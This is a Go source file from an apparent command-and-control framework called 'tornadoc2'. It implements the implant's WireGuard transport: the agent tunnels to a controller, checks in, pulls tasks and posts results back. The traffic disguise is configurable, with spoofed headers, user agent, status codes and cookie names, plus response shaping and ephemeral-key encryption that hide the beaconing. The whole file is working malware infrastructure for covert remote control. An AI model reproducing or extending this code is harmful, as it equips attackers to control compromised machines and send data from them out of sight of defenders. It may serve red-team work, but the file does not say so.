package transport

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/netip"
	"time"

	"github.com/chrj/wgnet"

	"tornadoc2/agent/crypto"
	"tornadoc2/agent/features"
	"tornadoc2/agent/protocol"
)

type wgTransport struct {
	serverPubKey string
	serverAddr   string
	agentPrivKey string
	tunnelIP     netip.Addr
	serverIP     netip.Addr
	serverPort string
	profile protocol.Profile
	shaping *features.ShapingSpec
	tlsCfg  *tls.Config
	cookie  string
	dev *wgnet.Device
}

func NewWireGuardTransport(serverPubKey, serverAddr,
	agentPrivKey, tunnelIP, innerPort, serverTunnelIP string,
	profile protocol.Profile, tlsCfg *tls.Config,
	shaping *features.ShapingSpec) (*wgTransport, error) {

	if serverPubKey == "" {
		return nil, errors.New(
			"wireguard: server public key is required")
	}
	if serverAddr == "" {
		return nil, errors.New(
			"wireguard: server address is required")
	}
	if agentPrivKey == "" {
		return nil, errors.New(
			"wireguard: agent private key is required")
	}
	ip, err := netip.ParseAddr(tunnelIP)
	if err != nil {
		return nil, fmt.Errorf(
			"wireguard: bad tunnel IP %q: %w", tunnelIP, err)
	}
	if serverTunnelIP == "" {
		serverTunnelIP = "10.99.0.1"
	}
	srvIP, err := netip.ParseAddr(serverTunnelIP)
	if err != nil {
		return nil, fmt.Errorf(
			"wireguard: bad server tunnel IP %q: %w",
			serverTunnelIP, err)
	}
	serverPort := innerPort
	if serverPort == "" {
		serverPort = "8881"
	}
	return &wgTransport{
		serverPubKey: serverPubKey,
		serverAddr:   serverAddr,
		agentPrivKey: agentPrivKey,
		tunnelIP:     ip,
		serverIP:     srvIP,
		serverPort:   serverPort,
		profile:      profile,
		tlsCfg:       tlsCfg,
		shaping:      shaping,
	}, nil
}

func (t *wgTransport) Name() string { return "wireguard" }

func (t *wgTransport) connect() error {
	if t.dev != nil {
		return nil
	}
	cfg := wgnet.NewDefaultConfiguration()
	cfg.MyIPv4 = t.tunnelIP
	cfg.PrivateKey = t.agentPrivKey
	cfg.ServerPublicKey = t.serverPubKey
	cfg.ServerEndpoint = t.serverAddr

	dev, err := wgnet.NewDevice(cfg)
	if err != nil {
		return fmt.Errorf("wireguard: device: %w", err)
	}
	t.dev = dev
	return nil
}

func (t *wgTransport) do(req *http.Request) (*http.Response, error) {
	if err := t.connect(); err != nil {
		return nil, err
	}
	client := &http.Client{
		Timeout: 45 * time.Second,
		Transport: &http.Transport{
			DialContext: func(ctx context.Context,
				network, _ string) (net.Conn, error) {
				return t.dev.DialContext(ctx, network,
					t.serverIP.String()+":"+t.serverPort)
			},
			TLSClientConfig:   t.tlsCfg,
			ForceAttemptHTTP2: false,
		},
	}
	return client.Do(req)
}

func (t *wgTransport) buildHeaders(req *http.Request) {
	req.Header.Set("Content-Type", "application/json")
	for k, v := range t.profile.RequestHeaders {
		req.Header.Set(k, v)
	}
	for k, v := range t.profile.ExtraHeaders {
		req.Header.Set(k, v)
	}
	if t.profile.UserAgent != "" {
		req.Header.Set("User-Agent", t.profile.UserAgent)
	}
}

func (t *wgTransport) CheckIn(identity protocol.Identity,
	pubkeyPEM, identitySig string, identityTs int64,
	wire *crypto.WireSession) (*protocol.CheckinResponse, error) {

	payload := protocol.CheckinRequest{Identity: identity}
	if pubkeyPEM != "" {
		payload.AgentPubKey = pubkeyPEM
	}
	if identitySig != "" {
		payload.IdentitySig = identitySig
		payload.IdentityTs = identityTs
	}
	body, err := json.Marshal(payload)
	if err != nil {
		return nil, err
	}
	if wire != nil {
		body, err = wire.EncryptRequest(body)
		if err != nil {
			return nil, err
		}
	}
	url := "https://" + t.serverIP.String() + ":" +
		t.serverPort + t.profile.BeaconPath
	req, err := http.NewRequest("POST", url,
		bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	t.buildHeaders(req)

	resp, err := t.do(req)
	if err != nil {
		return nil, fmt.Errorf("wireguard: %w", err)
	}
	defer resp.Body.Close()
	wantBeacon := 200
	if t.profile.Status != nil && t.profile.Status.Beacon > 0 {
		wantBeacon = t.profile.Status.Beacon
	}
	if resp.StatusCode == 403 && wantBeacon != 403 {
		return nil, errors.New("wireguard: checkin 403")
	}
	if resp.StatusCode != wantBeacon {
		return nil, fmt.Errorf("wireguard: status %d (wanted %d)",
			resp.StatusCode, wantBeacon)
	}
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	if t.shaping != nil && t.shaping.CheckinResponse != nil {
		if env := extractEnvelope(resp, t.shaping.CheckinResponse); env != nil {
			respBody = env
		}
	}
	if wire != nil {
		plain, wasEnc, derr := wire.DecryptResponse(respBody)
		if derr != nil {
			return nil, fmt.Errorf("decrypt: %w", derr)
		}
		if wasEnc {
			respBody = plain
		}
	}
	if t.shaping != nil && t.shaping.CheckinResponse != nil {
		u, err := features.ShapeUnwrap(respBody,
			t.shaping.CheckinResponse)
		if err != nil {
			return nil, fmt.Errorf("checkin shape: %w", err)
		}
		respBody = u
	}
	var out protocol.CheckinResponse
	if err := json.Unmarshal(respBody, &out); err != nil {
		return nil, err
	}
	if out.Cookie == "" {
		return nil, errors.New(
			"wireguard: checkin reply missing cookie")
	}
	t.cookie = out.Cookie
	return &out, nil
}

func (t *wgTransport) FetchTasks(wire *crypto.WireSession) ([]protocol.Task, error) {
	if t.cookie == "" {
		return nil, errors.New("wireguard: no session cookie")
	}
	url := "https://" + t.serverIP.String() + ":" +
		t.serverPort + t.profile.TasksPath
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}
	t.buildHeaders(req)
	if wire != nil {
		epk, rerr := wire.RotateEphemeral()
		if rerr != nil {
			return nil, rerr
		}
		req.Header.Set("X-ECDH-Pubkey", epk)
	}
	cookieName := t.profile.CookieName
	if cookieName == "" {
		cookieName = "sid"
	}
	req.Header.Set("Cookie", cookieName+"="+t.cookie)

	resp, err := t.do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	wantTasks := 200
	if t.profile.Status != nil && t.profile.Status.Tasks > 0 {
		wantTasks = t.profile.Status.Tasks
	}
	if resp.StatusCode != wantTasks {
		return nil, fmt.Errorf("wireguard: tasks status %d (wanted %d)",
			resp.StatusCode, wantTasks)
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	if t.shaping != nil && t.shaping.TasksResponse != nil {
		if env := extractEnvelope(resp, t.shaping.TasksResponse); env != nil {
			body = env
		}
	}
	if wire != nil {
		plain, wasEnc, derr := wire.DecryptResponse(body)
		if derr != nil {
			return nil, fmt.Errorf("decrypt: %w", derr)
		}
		if wasEnc {
			body = plain
		}
	}
	if t.shaping != nil && t.shaping.TasksResponse != nil {
		u, err := features.ShapeUnwrap(body,
			t.shaping.TasksResponse)
		if err != nil {
			return nil, fmt.Errorf("tasks shape: %w", err)
		}
		body = u
	}
	var tasks []protocol.Task
	if err := json.Unmarshal(body, &tasks); err != nil {
		return nil, err
	}
	return tasks, nil
}

func (t *wgTransport) PostResult(r protocol.Result,
	wire *crypto.WireSession) error {

	if t.cookie == "" {
		return errors.New("wireguard: no session cookie")
	}
	body, err := json.Marshal(r)
	if err != nil {
		return err
	}
	if t.shaping != nil && t.shaping.ResultsRequest != nil {
		body, err = features.ShapeWrap(
			t.shaping.ResultsRequest, r)
		if err != nil {
			return err
		}
	}
	if wire != nil {
		body, err = wire.EncryptRequest(body)
		if err != nil {
			return err
		}
	}
	url := "https://" + t.serverIP.String() + ":" +
		t.serverPort + t.profile.ResultsPath
	req, err := http.NewRequest("POST", url,
		bytes.NewReader(body))
	if err != nil {
		return err
	}
	t.buildHeaders(req)
	cookieName := t.profile.CookieName
	if cookieName == "" {
		cookieName = "sid"
	}
	req.Header.Set("Cookie", cookieName+"="+t.cookie)

	resp, err := t.do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	wantResults := 204
	if t.profile.Status != nil && t.profile.Status.Results > 0 {
		wantResults = t.profile.Status.Results
	}
	if resp.StatusCode != wantResults {
		return fmt.Errorf("wireguard: results status %d (wanted %d)",
			resp.StatusCode, wantResults)
	}
	return nil
}

func (t *wgTransport) Close() error {
	if t.dev != nil {
		t.dev.Close()
		t.dev = nil
	}
	return nil
}